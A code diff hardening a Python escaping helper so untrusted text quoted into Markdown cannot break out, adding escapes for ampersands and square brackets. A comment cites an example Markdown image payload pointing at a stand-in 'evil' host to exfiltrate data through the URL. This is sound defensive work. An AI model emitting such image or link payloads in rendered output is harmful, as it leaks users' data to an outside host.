@@ -23,7 +23,16 @@ class UntrustedText(BaseModel):
 
 
 def _escape(text: str) -> str:
-    return text.replace("`", "\\`").replace("<", "&lt;").replace(">", "&gt;")
+    # ``&`` first so the entities added below are not double-escaped; ``[``/``]`` so a
+    # link or image (``![x](https://evil/?q=...)``) cannot render and exfiltrate data.
+    return (
+        text.replace("&", "&amp;")
+        .replace("`", "\\`")
+        .replace("<", "&lt;")
+        .replace(">", "&gt;")
+        .replace("[", "\\[")
+        .replace("]", "\\]")
+    )
 
 
 def single_line(text: str) -> str:
@@ -48,9 +57,9 @@ def code_span(name: str) -> str:
 def quote_untrusted(text: str, *, source: str) -> str:
     """Render ``text`` as a Markdown blockquote that cannot break out of its quote.
 
-    Backticks and angle brackets are escaped (so fences, HTML and a forged quote header
-    stay inert), every line is prefixed ``> ``, and the text is cut to 2000 characters
-    with an ellipsis.
+    Ampersands, backticks, angle brackets and square brackets are escaped (so fences,
+    HTML, links, images and a forged quote header stay inert), every line is prefixed
+    ``> ``, and the text is cut to 2000 characters with an ellipsis.
     """
     if len(text) > MAX_QUOTED_CHARS:
         text = text[: MAX_QUOTED_CHARS - 1] + "…"
